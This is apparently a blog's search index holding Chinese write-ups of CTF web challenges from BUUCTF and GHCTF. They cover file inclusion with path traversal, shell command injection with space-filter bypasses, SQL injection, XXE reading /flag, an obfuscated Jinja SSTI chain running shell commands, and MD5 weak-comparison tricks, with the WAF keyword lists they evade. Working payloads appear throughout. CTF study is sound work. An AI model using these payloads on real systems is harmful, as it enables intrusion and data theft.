<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF</title>
    <url>/2025/03/28/BUUCTF/</url>
    <content><![CDATA[<h2 id="HCTF-2018-WarmUp-1"><a href="#HCTF-2018-WarmUp-1" class="headerlink" title="[HCTF 2018]WarmUp 1"></a>[HCTF 2018]WarmUp 1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题是简单的绕过，我们主要了解函数</p>
<p><strong>mb_substr（x1，x2，x3）</strong>，这个函数用于截取字符串，x1是字符串，x2是起始位置，x3是截取个数。</p>
<p><strong>mb_strpos（x1，x2）</strong>，这个函数用于查找字符在字符串中的位置，x1是字符串，x2是什么字符。</p>
<p><strong>include</strong>函数有这么一个神奇的功能：以字符‘&#x2F;’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘&#x2F;’后面的文件——注意是最后一个‘&#x2F;’。</p>
<p>payload：?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p>
<h2 id="GXYCTF2019-Ping-Ping-Ping（空格绕过）"><a href="#GXYCTF2019-Ping-Ping-Ping（空格绕过）" class="headerlink" title="[GXYCTF2019]Ping Ping Ping（空格绕过）"></a>[GXYCTF2019]Ping Ping Ping（空格绕过）</h2><p>这题是命令执行</p>
<p>我们主要了解空格过滤绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;IFS&#125;$9</span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure>

<p>读源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">PING <span class="number">127.0</span>.<span class="number">0.1</span> (<span class="number">127.0</span>.<span class="number">0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))</span><br></pre></td></tr></table></figure>

<p>这里flag必须按照顺序出现，中间可以插入任意字符。我们可以用变量替换来绕过这种简单的过滤。</p>
<p><code>payload：?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></p>
<h2 id="SUCTF-2019-EasySQL（PIPES-AS-CONCAT）"><a href="#SUCTF-2019-EasySQL（PIPES-AS-CONCAT）" class="headerlink" title="[SUCTF 2019]EasySQL（PIPES_AS_CONCAT）"></a>[SUCTF 2019]EasySQL（PIPES_AS_CONCAT）</h2><p>我们注入万能钥匙<strong>‘’ or 1&#x3D;1</strong>发现返回的是nonono</p>
<p>猜测是or被过滤了，我们可以使用bp爆破来看哪些关键字被过滤了。</p>
<p>最后发现<strong>prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|”</strong><br>都被过滤了那么联合注入，报错注入，盲注啥的都不能用了，但还有一个堆叠注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1；show databases;</span><br><span class="line">回显：Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test ) </span><br></pre></td></tr></table></figure>

<p>那么确实可以用堆叠注入。</p>
<p>进行尝试后，发现只有当输入是非零数字的时候有回显，而0或字符的时候是无回显的，那么我们可以猜测有||运算符，这个运算符在mysql里是或运算，在其他大部分的数据库中是字符连接符号。</p>
<p>源码中确实有**$sql &#x3D; “select “.$post[‘query’].”||flag from Flag”;**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select command1 || command2 </span><br><span class="line"></span><br><span class="line">情况一：若command1为非0数字，则结果为1。</span><br><span class="line"></span><br><span class="line">情况二：若command1为0或字母，command2为非0数字，则结果为1。</span><br><span class="line"></span><br><span class="line">情况三：command1和command2都不为非0数字，则结果为0。</span><br></pre></td></tr></table></figure>

<p><strong>方法一：</strong>使用 sql_mode 中的 PIPES_AS_CONCAT 函数。</p>
<p>PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。</p>
<p><strong>注意</strong>：select 1 || flag from Flag的意思将变成 先查询1 再查询 flag，而不是查询1flag,只是查询的结果会拼接到一起</p>
<p>payload：<strong>1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</strong></p>
<p><strong>方法二：</strong></p>
<p> <strong>select * , 1 || flag from Flag</strong></p>
<p>这个代码会查询Flag中的所有内容。</p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><strong>知识点1</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php短标签</span><br><span class="line"> </span><br><span class="line">&lt;? echo &#x27;123&#x27;;?&gt;  #前提是开启配置参数short_open_tags=on</span><br><span class="line">&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;  #不需要开启参数设置</span><br><span class="line">&lt;% echo &#x27;123&#x27;;%&gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;echo &#x27;123&#x27;; &lt;/script&gt; #不需要修改参数开关，但是只能在7.0以下可用。</span><br></pre></td></tr></table></figure>

<p><strong>知识点2</strong></p>
<p>文件头绕过</p>
<p><strong>知识点3</strong></p>
<p>php3 php4 phtml 都会被当成php解析</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><strong>知识点1</strong></p>
<p>select查询语句中查数据库的便捷操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select flag from ctf.Flag</span><br></pre></td></tr></table></figure>

<p>这是从ctf库中的Flag表查flag字段</p>
<h2 id="bugku-sqli-0x1"><a href="#bugku-sqli-0x1" class="headerlink" title="[bugku] sqli-0x1"></a>[bugku] sqli-0x1</h2><p><strong>知识点1</strong></p>
<p>&#x2F;**&#x2F;这样的注释可绕过过滤union select这样的过滤机制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union/**/select</span><br></pre></td></tr></table></figure>

<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><strong>知识点1</strong>(php解析机制)</p>
<p>这题我们是用get方法传参，但是传的参数只能是字母，因为在注释中说了有waf，如果输入字母会有<img src="/../images/1747578037501.jpg" alt="1747578037501" loading="lazy"></p>
<p>我们这时可以这样绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php?num=phpinfo()     #这是原来的传参</span><br><span class="line">calc.php? num=phpinfo()    #绕过方法</span><br></pre></td></tr></table></figure>

<p>这是因为在参数还没传入后端的时候有个waf会先检查num中的值，这里我们在num前面加上空格实际的参数名就会变成“<strong>空格num</strong>“这时waf就不能识别参数名，那么输入字符也就不会被拦截，但当参数传到后端的时候，php的参数解析机制会去除参数中的一些<strong>特殊字符</strong>包括空格，换行符什么的，这样参数名就还是原来的<strong>num</strong>，这样就不会影响识别。</p>
<p><strong>知识点2</strong></p>
<p>chr()代替字符进行绕过</p>
<p><strong>知识点3</strong></p>
<p>var_dump,scandir(),file_get_contents()函数的使用</p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><strong>知识点1</strong></p>
<p><strong>md5($pass,true)</strong></p>
<p>PHP中md5函数如果第二个参数设为true，返回的是二进制内容</p>
<p><strong>知识点2</strong></p>
<p>只要’or’后面的字符串为一个非零的数字开头都会返回True</p>
<p><strong>知识点3</strong>(<strong>ffifdyop</strong>)</p>
<p>ffifdyop在被md5加密后返回的二进制内容会被php识别为<code>&#39;or&#39;6&lt;trash&gt;</code>(因为mysql会把二进制内容解释为ASCII码)</p>
<p>(<code>&lt;trash&gt;</code>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<code>&lt;trash&gt;</code>会在MySQL将其转换成整型比较时丢掉)</p>
<p><strong>知识点4</strong>(md5弱比较)</p>
<p>方法一（0e开头的）</p>
<p>由于弱比较之前都会先转化成相同的类型，而0e都会被视为科学计数法，0的多少次方都是0，所以只要0e开头的字符串就行，这里列举几个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>方法二(数组)（强比较也可以用）</p>
<p>md5()函数无法识别数组，所以会返回NULL，如果俩都是NULL，那么条件也是相等的。</p>
]]></content>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>GHCTFwp</title>
    <url>/2025/03/01/GHCTFwp/</url>
    <content><![CDATA[<h1 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h1><p>战队名：先辈の队</p>
<p>比赛排名：4</p>
<p>联系方式:3011366557</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="﹏"><a href="#﹏" class="headerlink" title="(&gt;﹏&lt;)"></a>(&gt;﹏&lt;)</h2><p>看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import base64</span><br><span class="line">from lxml import etree</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 创建一个Flask应用实例</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># 定义一个路由，当访问网站根目录时触发</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    # 打开当前Python文件并读取内容，然后返回给客户端</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"># 定义一个路由，当以POST方法访问/ghctf路径时触发</span><br><span class="line">@app.route(&#x27;/ghctf&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def parse():</span><br><span class="line">    # 从POST请求的表单中获取名为&#x27;xml&#x27;的字段</span><br><span class="line">    xml = request.form.get(&#x27;xml&#x27;)</span><br><span class="line">    # 打印获取到的xml内容</span><br><span class="line">    print(xml)</span><br><span class="line">    </span><br><span class="line">    # 如果没有提供&#x27;xml&#x27;字段，返回&quot;No System is Safe.&quot;</span><br><span class="line">    if xml is None:</span><br><span class="line">        return &quot;No System is Safe.&quot;</span><br><span class="line">    </span><br><span class="line">    # 创建一个lxml的XML解析器，允许加载DTD和解析实体</span><br><span class="line">    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)</span><br><span class="line">    </span><br><span class="line">    # 使用解析器解析xml字符串，获取XML的根元素</span><br><span class="line">    root = etree.fromstring(xml, parser)</span><br><span class="line">    </span><br><span class="line">    # 从XML中查找&#x27;name&#x27;标签，并获取其文本内容</span><br><span class="line">    name = root.find(&#x27;name&#x27;).text</span><br><span class="line">    </span><br><span class="line">    # 返回&#x27;name&#x27;标签的文本内容，如果没有找到则返回None</span><br><span class="line">    return name or None</span><br><span class="line"></span><br><span class="line"># 当这个脚本作为主程序运行时</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 在所有网络接口上运行应用，端口为8080</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>

<p>看到 <strong>parser &#x3D; etree.XMLParser(load_dtd&#x3D;True, resolve_entities&#x3D;True)</strong></p>
<p>我们可以利用XXE攻击，即XML外部实体攻击。</p>
<p>首先我们要抓包将其改为POST方法，并访问&#x2F;ghctf，页面上显示<code>No System is Safe.</code></p>
<p>由于文件允许加载DTD和解析实体，我们xml字段中的内容可以写为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>其中<code>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</code></p>
<p>定义了一个名为xxe的实体并且其值是本地文件中flag文件的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>在根目录的name标签中引用xxe。</p>
<p>由于Content-Type<code>是</code>application&#x2F;x-www-form-urlencoded所以我们要把这个xml文本用url编码并复制到请求体的xml字段中再发送便能得到</p>
<h3 id="flag："><a href="#flag：" class="headerlink" title="flag："></a>flag：</h3><p>NSSCTF{7e4db57a-3ded-4ff4-972f-9873e2168114}</p>
<h2 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h2><p>查看附件app.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def view_file(filename):</span><br><span class="line">    try:</span><br><span class="line">        # 1. 过滤文件名</span><br><span class="line">        safe_filename = secure_filename(filename)</span><br><span class="line">        if not safe_filename:</span><br><span class="line">            abort(400, description=&quot;无效文件名&quot;)</span><br><span class="line"></span><br><span class="line">        # 2. 构造完整路径</span><br><span class="line">        file_path = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], safe_filename)</span><br><span class="line"></span><br><span class="line">        # 3. 路径安全检查</span><br><span class="line">        if not is_safe_path(app.config[&#x27;UPLOAD_FOLDER&#x27;], file_path):</span><br><span class="line">            abort(403, description=&quot;禁止访问的路径&quot;)</span><br><span class="line"></span><br><span class="line">        # 4. 检查文件是否存在</span><br><span class="line">        if not os.path.isfile(file_path):</span><br><span class="line">            abort(404, description=&quot;文件不存在&quot;)</span><br><span class="line"></span><br><span class="line">        suffix=os.path.splitext(filename)[1]</span><br><span class="line">        print(suffix)</span><br><span class="line">        if suffix==&quot;.jpg&quot; or suffix==&quot;.png&quot; or suffix==&quot;.gif&quot;:</span><br><span class="line">            return send_from_directory(&quot;static/uploads/&quot;,filename,mimetype=&#x27;image/jpeg&#x27;)</span><br><span class="line"></span><br><span class="line">        if contains_dangerous_keywords(file_path):</span><br><span class="line">            # 删除不安全的文件</span><br><span class="line">            os.remove(file_path)</span><br><span class="line">            return jsonify(&#123;&quot;error&quot;: &quot;Waf!!!!&quot;&#125;), 400</span><br><span class="line"></span><br><span class="line">        with open(file_path, &#x27;rb&#x27;) as f:</span><br><span class="line">            file_data = f.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">        tmp_str = &quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html lang=&quot;zh&quot;&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">            &lt;title&gt;查看文件内容&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;</span><br><span class="line">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;</span><br><span class="line"></span><br><span class="line">            &lt;footer&gt;</span><br><span class="line">                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;</span><br><span class="line">            &lt;/footer&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        &quot;&quot;&quot;.format(name=safe_filename, data=file_data)</span><br><span class="line"></span><br><span class="line">        return render_template_string(tmp_str)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        app.logger.error(f&quot;文件查看失败: &#123;str(e)&#125;&quot;)</span><br><span class="line">        abort(500, description=&quot;文件查看失败:&#123;&#125; &quot;.format(str(e)))</span><br></pre></td></tr></table></figure>



<p>发现<code>render_template_string(tmp_str)</code>这个函数能渲染html模板，模板中有我们上传文件中的内容，那么我们可以想到在我们上传的文件中写入一些危险代码随后再进行访问来显示flag。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>我们首先在文件中写入49发现访问文件后回显的是49，说明存在模板注入。</p>
<p>接着我们就可以开始构造我们的攻击代码，基本的代码是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__bases__[0].__subclasses__()[370](&quot;cat /flag&quot;, shell=True, stdout=-1).communicate() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其中__subclasses__()[370]是类&lt;class ‘subprocess.Popen’&gt;</p>
<p>但是由于过滤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dangerous_keywords = [&#x27;_&#x27;, &#x27;os&#x27;, &#x27;subclasses&#x27;, &#x27;__builtins__&#x27;, &#x27;__globals__&#x27;,&#x27;flag&#x27;,]</span><br></pre></td></tr></table></figure>

<p>我们需要把_换成16进制的\x5f,把subclasses拆分成两个字符串，那么便可以得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; []|attr(&quot;\x5f\x5fclass\x5f\x5f&quot;)|attr(&quot;\x5f\x5fbases\x5f\x5f&quot;)|first|attr(&quot;\x5f\x5fsubcla&quot;+&quot;sses\x5f\x5f&quot;)()|list|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(370)|attr(&quot;\x5f\x5fcall\x5f\x5f&quot;)(&quot;cat /fl\x61g&quot;, shell=True, stdout=-1)|attr(&quot;communicate&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里|attr可以避免使用<code>.</code></p>
<p><code>\x5f</code>绕过_,<code>fl\x61g</code>绕过flag，利用 <code>communicate()</code> 方法来执行命令并获取输出。上传并访问便能得到</p>
<h3 id="flag：-1"><a href="#flag：-1" class="headerlink" title="flag："></a>flag：</h3><p>NSSCTF{f9359d63-c8f5-4f3a-ae52-d164bbc158c6}</p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h2><p>先使用联合查询判断显示位</p>
<p><code>?id=0 union select 1,2,3,4,5</code></p>
<p><img src="/../images/1740890606674.jpg" alt="1740890606674" loading="lazy"></p>
<p>但是不知道数据库是哪种，于是我问ai各种数据库查询版本的代码最后查出是sqlite</p>
<p><img src="/../images/1740890718774.jpg" alt="1740890718774" loading="lazy"></p>
<p>随后直接查询flag</p>
<p><img src="/../images/1740890779787.jpg" alt="1740890779787" loading="lazy"></p>
<p>成功。</p>
<h2 id="POppppppp"><a href="#POppppppp" class="headerlink" title="POppppppp"></a>POppppppp</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据源码发现这题是反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span 